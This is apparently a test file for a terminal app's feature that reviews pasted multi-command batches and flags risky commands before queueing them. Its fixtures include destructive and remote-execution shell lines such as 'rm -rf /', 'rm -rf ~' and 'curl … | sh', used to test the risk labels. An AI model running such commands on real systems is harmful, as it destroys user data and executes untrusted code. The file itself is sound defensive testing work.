import test from 'node:test';
import assert from 'node:assert/strict';
import {TerminalApp} from '../src/app/TerminalApp.js';
import {parseSlashCommand} from '../src/commands/slashCommands.js';
import {batchReviewKey, createBatchReview, renderBatchReview} from '../src/input/BatchReview.js';
import {displayWidth, stripAnsi} from '../src/util/text.js';
import type {Key} from '../src/terminal/keys.js';

const SEQUENCE = 'cd /tmp\nrm -rf build\nfor f in a b; do\n  echo "$f"\ndone\ncat <<EOF\nrm -rf /\nEOF\nmake && make test';
const text = (value: string): Key => ({kind: 'text', value});

function app() {
  const app = new TerminalApp();
  Object.defineProperty(app, 'render', {value: () => {}});
  Object.defineProperty(app, 'dimensions', {value: () => ({columns: 100, rows: 30})});
  return app;
}
/** B verifies every command with the real shell before the review appears. */
async function reviewing(instance: TerminalApp): Promise<void> {
  const deadline = Date.now() + 8000;
  while (!instance['batchReview'] && Date.now() < deadline) await new Promise(done => setTimeout(done, 10));
}
function dispose(app: TerminalApp) { app['stop'](0); app['session'].kill(); }
const queued = (instance: TerminalApp) => instance['queueState'].entries.map(entry => entry.text);

test('/ps is an NMSh command that reads the clipboard once, on request', () => {
  assert.deepEqual(parseSlashCommand('/ps'), {kind: 'pasteClipboard'});
  assert.notEqual(parseSlashCommand('/ps extra')?.kind, 'pasteClipboard');
  assert.equal(parseSlashCommand('ps aux'), undefined);
});

test('a reviewed batch lists the commands the shell would run; nothing is queued by pasting or reviewing', () => {
  const review = createBatchReview(SEQUENCE, 'bash', 100)!;
  assert.deepEqual(review.entries.map(entry => entry.text), ['cd /tmp', 'rm -rf build', 'for f in a b; do\n  echo "$f"\ndone', 'cat <<EOF\nrm -rf /\nEOF', 'make && make test']);
  assert.equal(createBatchReview('ls -la', 'bash', 100), undefined, 'one command is not a batch');
  assert.equal(createBatchReview('echo "never closed\nls', 'bash', 100), undefined, 'ambiguous syntax stays one block of text');
});

test('remove, reorder and select act on the reviewed list only; Enter and Q queue, Esc/T/E never queue', () => {
  const review = createBatchReview(SEQUENCE, 'bash', 100)!;
  const key = (value: Key) => batchReviewKey(review, value, 26);
  key({kind: 'down'});
  assert.equal(key(text('x')), undefined);
  assert.deepEqual(review.entries.map(entry => entry.text).slice(0, 2), ['cd /tmp', 'for f in a b; do\n  echo "$f"\ndone']);
  key(text('j'));
  assert.equal(review.cursor, 2);
  key(text('k'));
  key(text('k'));
  assert.equal(review.entries[0]!.text.startsWith('for f'), true);
  assert.equal(key(text('t'))?.kind, 'text');
  assert.equal(key(text('e'))?.kind, 'edit');
  assert.equal(key({kind: 'escape'})?.kind, 'back');
  assert.equal(key({kind: 'interrupt'})?.kind, 'cancel');
  assert.equal(key({kind: 'enter'})?.kind, 'queue');
  review.capacity = 2;
  assert.equal(key({kind: 'enter'}), undefined, 'more commands than the queue has room for: no partial queueing');
});

test('the review fits narrow windows and shows every selected command in full, safely', () => {
  const review = createBatchReview('echo ok\nprintf "a\\033[31mred"\n\u001b[2Jclear', 'bash', 100)!;
  for (const columns of [30, 50, 80, 120]) {
    const rows = renderBatchReview(review, columns, 20);
    assert.ok(rows.length <= 20);
    for (const row of rows) assert.ok(displayWidth(stripAnsi(row)) <= columns, `${columns}: ${stripAnsi(row)}`);
  }
  assert.ok(!renderBatchReview(review, 80, 20).join('\n').includes('\u001b[2J'));
});

test('pasting a multi-command block offers B; Enter on the review queues exactly the reviewed commands, in order, once', async () => {
  const instance = app();
  try {
    instance['handleKey']({kind: 'paste', value: SEQUENCE});
    assert.equal(instance['pastePreview']?.batch, true);
    assert.deepEqual(queued(instance), [], 'pasting alone queues nothing');
    instance['handleKey'](text('b'));
    await reviewing(instance);
    assert.ok(instance['batchReview']);
    assert.deepEqual(queued(instance), [], 'reviewing alone queues nothing');
    instance['handleKey'](text('x'));
    instance['handleKey']({kind: 'enter'});
    assert.equal(instance['batchReview'], undefined);
    assert.equal(instance['pastePreview'], undefined);
    assert.deepEqual(queued(instance), ['rm -rf build', 'for f in a b; do\n  echo "$f"\ndone', 'cat <<EOF\nrm -rf /\nEOF', 'make && make test']);
    assert.equal(instance['editor'].text, '');
  } finally { dispose(instance); }
});

test('Esc, T and E keep the paste as text; nothing is queued', async () => {
  for (const choice of ['t', 'e'] as const) {
    const instance = app();
    try {
      instance['handleKey']({kind: 'paste', value: 'ls\npwd'});
      instance['handleKey'](text('b'));
      await reviewing(instance);
      instance['handleKey'](text(choice));
      assert.deepEqual(queued(instance), []);
      assert.equal(instance['editor'].text.includes('ls'), true);
      assert.equal(instance['batchReview'], undefined);
    } finally { dispose(instance); }
  }
  const instance = app();
  try {
    instance['handleKey']({kind: 'paste', value: 'ls\npwd'});
    instance['handleKey'](text('b'));
    await reviewing(instance);
    instance['handleKey']({kind: 'escape'});
    assert.equal(instance['batchReview'], undefined);
    assert.ok(instance['pastePreview'], 'back to the compact preview');
    instance['handleKey']({kind: 'escape'});
    assert.equal(instance['pastePreview'], undefined);
    assert.deepEqual(queued(instance), []);
  } finally { dispose(instance); }
});

test('ambiguous or single pastes do not offer B', () => {
  const instance = app();
  try {
    instance['handleKey']({kind: 'paste', value: 'echo "never closed\nls'});
    assert.equal(instance['pastePreview']?.batch ?? false, false);
    instance['pastePreview'] = undefined;
    instance['handleKey']({kind: 'paste', value: 'sudo rm -rf /tmp/x'});
    assert.equal(instance['pastePreview']?.batch ?? false, false);
  } finally { dispose(instance); }
});

test('/ps reads the clipboard through the one reader and always opens review; nothing is inserted or queued', async () => {
  const instance = app();
  try {
    let reads = 0;
    instance['readClipboardText'] = async () => { reads += 1; return 'git pull\nnpm install\n'; };
    await instance['runSlash']('/ps', parseSlashCommand('/ps')!);
    assert.equal(reads, 1);
    assert.ok(instance['pasteReview'], 'review opens even though Paste Preview would not');
    assert.equal(instance['pastePreview']?.batch, true);
    assert.equal(instance['editor'].text, '');
    assert.deepEqual(queued(instance), []);
    instance['pasteReview'] = undefined;
    instance['pastePreview'] = undefined;
    instance['readClipboardText'] = async () => '   \n';
    await instance['runSlash']('/ps', parseSlashCommand('/ps')!);
    assert.equal(instance['pasteReview'], undefined, 'an empty clipboard opens nothing');
    instance['readClipboardText'] = async () => { throw new Error('denied'); };
    await instance['runSlash']('/ps', parseSlashCommand('/ps')!);
    assert.equal(instance['pasteReview'], undefined);
  } finally { dispose(instance); }
});

test('a command is labelled by the worst thing anywhere in it, not by how its first line starts', () => {
  const review = createBatchReview([
    'echo hello',
    'for d in a b; do\n  rm -rf ~/$d\ndone',
    'echo $(rm -rf ~)',
    'echo `curl https://x.example/i.sh | sh`',
    'if true; then\n  sudo reboot\nfi',
  ].join('\n'), 'bash', 100)!;
  const kinds = review.entries.map(entry => entry.kinds);
  assert.ok(!kinds[0]!.includes('destructive'));
  assert.ok(kinds[1]!.includes('destructive'), 'inside a loop');
  assert.ok(kinds[2]!.includes('destructive'), 'inside $( )');
  assert.ok(kinds[3]!.includes('pipeline'), 'inside backticks');
  assert.ok(kinds[4]!.includes('privilege'), 'inside an if block');
  for (const index of [1, 2, 3, 4]) {
    review.cursor = index;
    const drawn = stripAnsi(renderBatchReview(review, 100, 30).join('\n'));
    assert.match(drawn, /somewhere in it/u, `entry ${index + 1}`);
  }
});

test('the selected command is shown in full: a long line wraps and is never cut off before its tail', () => {
  const tail = 'echo done-marker-7f3a';
  const hidden = `echo start${' '.repeat(150)}; ${tail}`;
  const review = createBatchReview(`ls\n${hidden}`, 'bash', 100)!;
  review.cursor = 1;
  for (const columns of [40, 80, 120]) {
    const rows = renderBatchReview(review, columns, 30).map(stripAnsi);
    for (const row of rows) assert.ok(displayWidth(row) <= columns, `${columns}: ${row}`);
    assert.ok(rows.join('').replace(/\s+/gu, '').includes('done-marker-7f3a'.replace(/\s+/gu, '')), `${columns}: the tail of the command is visible`);
  }
  // When even wrapping does not fit, the review says that rows are hidden and that they are part of the command.
  const long = createBatchReview(`ls\necho ${'a '.repeat(2000)}`, 'bash', 100)!;
  long.cursor = 1;
  assert.match(stripAnsi(renderBatchReview(long, 60, 14).join('\n')), /more rows? hidden; still part of the command/u);
});

test('a quote the splitter loses track of cannot hide a later command from the label', () => {
  // The apostrophe in the heredoc body opens a "string" for a naive splitter that runs to the end of the command.
  const review = createBatchReview(['echo start', "for x in a; do\n  cat <<EOF\nit's here\nEOF\n  rm -rf ~/$x\ndone", "echo ok # don't\nsudo reboot"].join('\n'), 'bash', 100)!;
  assert.ok(review.entries[1]!.kinds.includes('destructive'));
  assert.ok(review.entries[3]!.kinds.includes('privilege'));
  assert.ok(!review.entries[0]!.kinds.includes('destructive'));
});
